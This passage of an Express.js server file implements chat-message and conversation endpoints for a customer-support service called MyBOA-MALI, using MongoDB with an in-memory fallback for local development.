            userId: userId,
            senderType: 'user',
            senderName: userDisplayName || 'Client MyBOA-MALI',
            content: trimmedMessage,
            contentType: 'text',
            status: 'sent',
            readByAdmin: false,
            readByUser: true,
            createdAt: now,
            metadata: { source: 'myboamali-web' }
        };

        if (db) {
            await db.collection('chatMessages').insertOne(messageDoc);
        } else {
            if (isProduction) {
                return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
            }
            inMemoryMessages.push(messageDoc);
        }

        // Send email alert to agent
        try {
            sendAgentEmailNotification(
                userDisplayName || conversation.userDisplayName || 'Client MyBOA-MALI',
                userInitiales || conversation.userInitiales || 'BJ',
                userId,
                activeConvId,
                trimmedMessage
            );
        } catch (emailErr) {
            console.error('Échec non bloquant de l\'envoi de l\'email agent:', emailErr);
        }

        res.json({
            success: true,
            conversationId: activeConvId,
            message: messageDoc
        });

    } catch (error) {
        console.error('Erreur POST /api/chat/messages:', error);
        if (isProduction) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. GET /api/chat/messages/:userId
app.get('/api/chat/messages/:userId', async (req, res) => {
    try {
        if (isProduction && !db) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }

        const { userId } = req.params;
        if (!userId) {
            return res.status(400).json({ success: false, error: 'userId requis' });
        }

        let conversation = null;
        let messages = [];

        if (db) {
            // Find active conversation
            conversation = await db.collection('chatConversations').findOne({ userId: userId, archived: { $ne: true } });
            if (conversation) {
                // Retrieve last 50 messages, sorted ascending by creation date
                messages = await db.collection('chatMessages')
                    .find({ conversationId: conversation.conversationId })
                    .sort({ createdAt: 1 })
                    .limit(50)
                    .toArray();
            }
        } else {
            if (isProduction) {
                return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
            }
            console.warn("Mode local : fallback mémoire chat actif, données non persistantes.");
            conversation = inMemoryConversations.find(c => c.userId === userId && !c.archived);
            if (conversation) {
                messages = inMemoryMessages
                    .filter(m => m.conversationId === conversation.conversationId)
                    .sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt))
                    .slice(0, 50);
            }
        }

        res.json({
            success: true,
            conversation: conversation,
            messages: messages
        });

    } catch (error) {
        console.error('Erreur GET /api/chat/messages:', error);
        if (isProduction) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. GET /api/chat/conversation/:userId
app.get('/api/chat/conversation/:userId', async (req, res) => {
    try {
        if (isProduction && !db) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }

        const { userId } = req.params;
        if (!userId) {
            return res.status(400).json({ success: false, error: 'userId requis' });
        }

        let conversation = null;
        if (db) {
            conversation = await db.collection('chatConversations').findOne({ userId: userId, archived: { $ne: true } });
        } else {
            if (isProduction) {
                return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
            }
            conversation = inMemoryConversations.find(c => c.userId === userId && !c.archived) || null;
        }

        res.json({
            success: true,
            conversation: conversation
        });

    } catch (error) {
        console.error('Erreur GET /api/chat/conversation:', error);
        if (isProduction) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/ping', (req, res) => {
    res.json({ status: 'ok', message: 'Serveur MyBOA-MALI operationnel' });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log('Serveur MyBOA-MALI demarre sur port', PORT);
});
